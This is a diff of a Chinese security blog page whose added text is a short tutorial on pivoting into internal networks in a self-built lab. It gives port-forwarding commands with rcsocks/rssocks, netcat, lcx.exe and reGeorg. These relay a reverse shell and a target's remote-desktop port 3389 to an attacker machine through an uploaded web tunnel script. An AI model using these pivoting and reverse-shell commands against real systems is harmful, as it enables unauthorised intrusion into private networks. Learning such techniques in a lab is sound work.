@@ -105,21 +105,22 @@
 
 
 
-<meta name="description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali">
+<meta name="description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
 <meta name="keywords" content="内网渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网穿透随想">
 <meta property="og:url" content="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/index.html">
 <meta property="og:site_name" content="Ha1g0的窝">
-<meta property="og:description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali">
+<meta property="og:description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png">
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/reGeorg.png">
-<meta property="og:updated_time" content="2017-12-12T10:00:27.163Z">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png">
+<meta property="og:updated_time" content="2017-12-12T10:43:45.195Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网穿透随想">
-<meta name="twitter:description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali">
+<meta name="twitter:description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
 <meta name="twitter:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
 
 
@@ -387,9 +388,10 @@
       
 
       
-        <p><img src="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png" alt="模拟"></p>
+        <p>整理整理最近碰到关于内网穿透（渗透）的一些基础知识</p>
+<h3 id="内网渗透随想"><a href="#内网渗透随想" class="headerlink" title="内网渗透随想"></a>内网渗透随想</h3><hr>
+<p><img src="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png" alt="模拟"></p>
 <p>上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外<br>段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali</p>
-<a id="more"></a>
 <p>上，现在需要Centos7做中转。<br>我在Centos上做端口转发</p>
 <p><code>cd /src</code><br><code>./rcsocks -l 1088 -p 1080 -vv</code></p>
 <p>现在我将Ubuntu上执行Python的反弹shell（反弹shell命令很多，请自行搜索），</p>
@@ -398,7 +400,27 @@
 <p><code>nc 192.168.80.129 1080</code><br>或者<br><code>./rssocks -vv -s 192.168.80.129:1080</code></p>
 <p><img src="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png" alt="西普市赛"></p>
 <p>这个环境是我上次市赛碰到的环境，当时没有在ssocks本地编译，所以用了另一个代理工具reGeorg<br>附上链接<a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-12514-1-1.html</a><br>用法跟ssocks有点区别，<br><img src="http://oohnuejim.bkt.clouddn.com/reGeorg.png" alt="reGeorg"><br>这个需要在双网卡服务器的web服务上放置一个tunnel脚本，比如php的就放置tunnel.nosocket.php，然后在本机执行正向连接到tunnel脚本的命令</p>
-<p><code>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</code></p>
+<p>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</p>
+<h3 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h3><hr>
+<p>再来简单地介绍介绍几个端口转发工具<br>适合自己的才是最好的</p>
+<ul>
+<li>lcx.exe （最容易被杀软干）</li>
+</ul>
+<p>反弹shell<br>攻击机<br><code>lcx.exe -listen 51 33891 把51的流量转发到33891上</code></p>
+<p>代理服务器（靶机）  </p>
+<p><code>lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389</code><br>把本机3389转发到攻击机的51端口上</p>
+<p>攻击机只需远程桌面连接 127.0.0.1:33891就能连接到靶机的3389了</p>
+<p><img src="http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png" alt="远程桌面"></p>
+<ul>
+<li>Reduh、reGeorg、Tunna</li>
+</ul>
+<p>用法都差不多，大同小异<br>具体看<br><a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-12514-1-1.html</a><br><a href="https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg" target="_blank" rel="external">https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg</a></p>
+<p>具体介绍一个reGeorg，比如说PHP的环境，就把tunnel.nosocket.php放在一个web目录下，然后<br>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</p>
+<p>windows 用proxifier对转发端口进行全局代理<br>linux 用proxychain</p>
+<ul>
+<li>ssocks</li>
+</ul>
+<p>这个工具在linux用的比较多<br>一些基础用法 在上面的演示中也讲到了，具体看<br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/12182.html</a></p>
 
       
     </div>
@@ -517,8 +539,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg"
@@ -621,6 +652,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网渗透随想"><span class="nav-number">1.</span> <span class="nav-text">内网渗透随想</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发工具"><span class="nav-number">2.</span> <span class="nav-text">端口转发工具</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
